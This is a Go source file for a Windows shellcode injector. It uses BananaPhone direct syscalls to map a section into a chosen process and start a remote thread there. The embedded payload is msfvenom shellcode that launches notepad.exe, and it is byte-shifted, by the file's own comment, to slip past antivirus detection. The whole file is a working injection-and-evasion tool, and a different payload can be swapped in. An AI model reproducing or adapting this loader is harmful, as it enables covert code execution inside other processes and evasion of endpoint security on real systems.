package main

import (
	"fmt"
	"github.com/TheTitanrain/w32"
	"os"
	"time"
	"unsafe"

	hl "gitlab.com/mjwhitta/hilighter"
	"golang.org/x/sys/windows"
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
)

type clientID struct {
	UniqueProcess uintptr
	UniqueThread  uintptr
}

type objectAttrs struct {
	Length                   uintptr
	RootDirectory            uintptr
	ObjectName               uintptr
	Attributes               uintptr
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

// Why are these not defined in the windows pkg?!

// ProcessAllAccess is the PROCESS_ALL_ACCESS const from winnt.h
const ProcessAllAccess = 0x1fffff

// SecCommit is the SEC_COMMIT const from winnt.h
const SecCommit = 0x08000000

// SectionWrite is the SECTION_MAP_WRITE const from winnt.h
const SectionWrite = 0x2

// SectionRead is the SECTION_MAP_READ const from winnt.h
const SectionRead = 0x4

// SectionExecute is the SECTION_MAP_EXECUTE const from winnt.h
const SectionExecute = 0x8

// SectionRWX is the combination of READ, WRITE, and EXECUTE
const SectionRWX = SectionWrite | SectionRead | SectionExecute

// Suspended can be set to true to suspend created threads
var Suspended = false

var ntdll *windows.LazyDLL

func init() {
	// Load DLL
	ntdll = windows.NewLazySystemDLL("ntdll")
}


// NtCreateSection from ntdll.
func NtCreateSection(
	ntsection uint16,
	sHndl *windows.Handle,
	access uintptr,
	size uint64,
	pagePerms uintptr,
	secPerms uintptr,
) error {
	r1, r := bananaphone.Syscall(
		ntsection,
		uintptr(unsafe.Pointer(sHndl)),
		access,
		0,
		uintptr(unsafe.Pointer(&size)),
		pagePerms,
		secPerms,
		0,
	)
	if r != nil {
		fmt.Printf("ntcreatesection %s %x\n", r, r1)
		return r
	}
	return nil
}

// NtMapViewOfSection from ntdll.
func NtMapViewOfSection(
	ntmap uint16,
	sHndl windows.Handle,
	pHndl windows.Handle,
	size uint64,
	inheritPerms uintptr,
	pagePerms uintptr,
) (scBase uintptr, e error) {
	var scOffset uintptr

	_, err := bananaphone.Syscall(
		ntmap,
		uintptr(sHndl),
		uintptr(pHndl),
		uintptr(unsafe.Pointer(&scBase)),
		0,
		0,
		uintptr(unsafe.Pointer(&scOffset)),
		uintptr(unsafe.Pointer(&size)),
		inheritPerms,
		0,
		pagePerms,
		0,
	)
	if err != nil {
		e = hl.Errorf("NtMapViewOfSection returned  %s", err)
	} else if scBase == 0 {
		e = hl.Errorf("NtMapViewOfSection failed for unknown reason")
	} else {
		e = nil
	}

	return
}

// NtOpenProcess from ntdll.
func NtOpenProcess(
	ntopen uint16,
	pid uint32,
	access uintptr,
) (pHndl windows.Handle, e error) {
	_, err := bananaphone.Syscall(
		ntopen,
		uintptr(unsafe.Pointer(&pHndl)),
		access,
		uintptr(unsafe.Pointer(&objectAttrs{0, 0, 0, 0, 0, 0})),
		uintptr(unsafe.Pointer(&clientID{uintptr(pid), 0})),
		0,
	)
	if err != nil {
		e = hl.Errorf("ntOpenProcess returned %s", err)
	} else if pHndl == 0 {
		e = hl.Errorf("ntOpenProcess failed for unknown reason")
	} else {
		e = nil
	}

	return
}

// NtWriteVirtualMemory from ntdll.
func NtWriteVirtualMemory(
	ntwrite uint16,
	pHndl windows.Handle,
	dst uintptr,
	b []byte,
) error {

	r1, r := bananaphone.Syscall(
		ntwrite,
		uintptr(pHndl),
		dst,
		uintptr(unsafe.Pointer(&b[0])),
		uintptr(len(b)),
		0,
	)
	if r != nil {
		fmt.Printf("ntwrite %s %x\n", r, r1)
		return r
	}
	return nil
}

// RtlCreateUserThread from ntdll.
func RtlCreateUserThread(
	pHndl windows.Handle,
	addr uintptr,
	sspnd bool,
) (tHndl windows.Handle, e error) {
	var err uintptr
	var suspend uintptr

	if sspnd {
		suspend = 1
	}

	err, _, _ = ntdll.NewProc("RtlCreateUserThread").Call(
		uintptr(pHndl),
		0,
		suspend,
		0,
		0,
		0,
		addr,
		0,
		uintptr(unsafe.Pointer(&tHndl)),
		0,
	)
	if err != 0 {
		e = hl.Errorf("RtlCreateUserThread returned %0x", uint32(err))
	} else if tHndl == 0 {
		e = hl.Errorf("RtlCreateUserThread failed for unknown reason")
	} else {
		e = nil
	}

	return
}


// WithNtCreateSection will launch the provided shellcode using
// NtCreateSection, NtMapViewOfSection, NtWriteVirtualMemory,
// NtMapViewOfSection (again) and RtlCreateUserThread.
func WithNtCreateSection(pid uint32, sc []byte, ntsection,ntmap,ntopen,ntwrite uint16) error {
	var addr uintptr
	var e error
	var pHndl windows.Handle
	var sHndl windows.Handle

	// Ensure shellcode was provided
	if len(sc) == 0 {
		return hl.Errorf("No shellcode provided")
	}

	// Get process handle
	pHndl = windows.CurrentProcess()

	// Get handle for section object
	e = NtCreateSection(
		ntsection,
		&sHndl,
		SectionRWX,
		uint64(len(sc)),
		windows.PAGE_EXECUTE_READWRITE,
		SecCommit,
	)
	if e != nil {
		return e
	}

	// Create RW view
	addr, e = NtMapViewOfSection(
		ntmap,
		sHndl,
		pHndl,
		uint64(len(sc)),
		windows.SUB_CONTAINERS_ONLY_INHERIT,
		windows.PAGE_READWRITE,
	)
	if e != nil {
		return hl.Errorf("Error mapping RW view: %s", e.Error())
	}

	// Copy shellcode to RW view
	if e = NtWriteVirtualMemory(ntwrite,pHndl, addr, sc); e != nil {
		return e
	}

	// Get remote process handle if requested
	if pid != 0 {
		if pHndl, e = NtOpenProcess(ntopen, pid, ProcessAllAccess); e != nil {
			return e
		}
		defer windows.CloseHandle(pHndl)
	}

	// Create RX view
	addr, e = NtMapViewOfSection(
		ntmap,
		sHndl,
		pHndl,
		uint64(len(sc)),
		windows.SUB_CONTAINERS_ONLY_INHERIT,
		windows.PAGE_EXECUTE_READ,
	)
	if e != nil {
		return hl.Errorf("Error mapping RX view: %s", e.Error())
	}

	// Get handle for new thread
	_, e = RtlCreateUserThread(pHndl, addr, Suspended)
	return e
}

func getprocname(id uint32) string {
	snapshot := w32.CreateToolhelp32Snapshot(w32.TH32CS_SNAPMODULE, id)
	var me w32.MODULEENTRY32
	me.Size = uint32(unsafe.Sizeof(me))
	if w32.Module32First(snapshot, &me) {
		return w32.UTF16PtrToString(&me.SzModule[0])
	}
	return ""
}

func getpid(pname []string) uint32 {
	// enter target processes here, the more the better..
	//target_procs := []string{"notepad.exe", "OneDrive.exe", "explorer.exe"}
	target_procs := pname[1:]
	sz := uint32(1000)
	procs := make([]uint32, sz)
	var bytesReturned uint32
	for _,proc := range target_procs {
		if w32.EnumProcesses(procs, sz, &bytesReturned) {
			for _, pid := range procs[:int(bytesReturned)/4] {
				if getprocname(pid) == proc {
					return pid
				} else {
					// sleep to limit cpu usage
					time.Sleep(5 * time.Millisecond)
				}
			}
		}
	}
	return 0
}


func main(){
	var (
		// Shellcode
		// msfvenom -p windows/x64/exec CMD=notepad.exe EXITFUNC=thread -f c
		// Payload size: 279 bytes
		// Shifted 10 bytes right to prevent AV detection of shellcode.
		sc = []byte("" +
			"\x06\x52\x8d\xee\xfa\xf2\xca\x0a\x0a\x0a\x4b\x5b\x4b\x5a\x5c\x5b\x60\x52\x3b\xdc" +
			"\x6f\x52\x95\x5c\x6a\x52\x95\x5c\x22\x52\x95\x5c\x2a\x52\x95\x7c\x5a\x52\x19\xc1" +
			"\x54\x54\x57\x3b\xd3\x52\x3b\xca\xb6\x46\x6b\x86\x0c\x36\x2a\x4b\xcb\xd3\x17\x4b" +
			"\x0b\xcb\xec\xf7\x5c\x4b\x5b\x52\x95\x5c\x2a\x95\x4c\x46\x52\x0b\xda\x95\x8a\x92" +
			"\x0a\x0a\x0a\x52\x8f\xca\x7e\x71\x52\x0b\xda\x5a\x95\x52\x22\x4e\x95\x4a\x2a\x53" +
			"\x0b\xda\xed\x60\x52\x09\xd3\x4b\x95\x3e\x92\x52\x0b\xe0\x57\x3b\xd3\x52\x3b\xca" +
			"\xb6\x4b\xcb\xd3\x17\x4b\x0b\xcb\x42\xea\x7f\xfb\x56\x0d\x56\x2e\x12\x4f\x43\xdb" +
			"\x7f\xe2\x62\x4e\x95\x4a\x2e\x53\x0b\xda\x70\x4b\x95\x16\x52\x4e\x95\x4a\x26\x53" +
			"\x0b\xda\x4b\x95\x0e\x92\x52\x0b\xda\x4b\x62\x4b\x62\x68\x63\x64\x4b\x62\x4b\x63" +
			"\x4b\x64\x52\x8d\xf6\x2a\x4b\x5c\x09\xea\x62\x4b\x63\x64\x52\x95\x1c\xf3\x61\x09" +
			"\x09\x09\x67\x52\xc4\x0b\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x52\x97\x97\x0b\x0b\x0a\x0a" +
			"\x4b\xc4\x3b\x95\x79\x91\x09\xdf\xc5\xea\x27\x34\x14\x4b\xc4\xb0\x9f\xc7\xa7\x09" +
			"\xdf\x52\x8d\xce\x32\x46\x10\x86\x14\x8a\x05\xea\x7f\x0f\xc5\x51\x1d\x7c\x79\x74" +
			"\x0a\x63\x4b\x93\xe4\x09\xdf\x78\x79\x7e\x6f\x7a\x6b\x6e\x38\x6f\x82\x6f\x0a",
		)
	)

	//processName input
	if len(os.Args) < 2 {
		fmt.Fprintf(os.Stderr, "%s <pName>", os.Args[0])
		os.Exit(1)
	}
	pid := getpid(os.Args)

	for i := range sc {
		sc[i] -= 10
	}
	//Declare BananaPhone
	bp, e := bananaphone.NewBananaPhone(bananaphone.DiskBananaPhoneMode)
	if e != nil {
		panic(e)
	}
	ntsection, e := bp.GetSysID("NtCreateSection")
	if e != nil {
		panic(e)
	}
	ntmap, e := bp.GetSysID("NtMapViewOfSection")
	if e != nil {
		panic(e)
	}
	ntwrite, e := bp.GetSysID("NtWriteVirtualMemory")
	if e != nil {
		panic(e)
	}
	ntopen, e := bp.GetSysID("NtOpenProcess")
	if e != nil {
		panic(e)
	}


	if e = WithNtCreateSection(pid, sc,ntsection,ntmap,ntopen,ntwrite); e != nil {
		panic(e)
	}
}